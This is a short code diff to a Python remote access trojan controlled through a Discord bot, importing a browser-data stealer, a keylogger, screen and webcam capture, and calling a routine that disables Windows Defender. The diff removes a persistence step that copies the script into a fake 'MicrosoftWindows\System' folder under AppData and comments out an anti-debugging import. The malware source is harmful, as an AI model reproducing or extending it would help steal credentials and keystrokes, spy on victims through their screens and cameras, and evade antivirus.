@@ -1,8 +1,8 @@
-import os, discord, subprocess, requests, ctypes, zipfile, shutil
+import os, discord, subprocess, requests, ctypes, zipfile#, shutil
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
-from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE#, ANTIDEBUG
+from config import TOKEN, GUILD_ID, DEFENDER, ERROR#, MOVE, ANTIDEBUG
 from modules.browser import run, delete_files
 from modules.keylogger import Keylogger
 #from modules.antidebug import Antidebug
@@ -26,16 +26,6 @@ def disable_defender():
     
 if DEFENDER:
     disable_defender()
-
-file_dir = os.path.dirname(os.path.abspath(__file__))
-
-def move():
-    shutil.copy(f"{file_dir}\{os.path.basename(__file__)}", f"{os.getenv('appdata')}\MicrosoftWindows\System")
-    
-
-
-if MOVE and file_dir != f"{os.getenv('appdata')}\MicrosoftWindows\System":
-    move()
 
 
 def error():
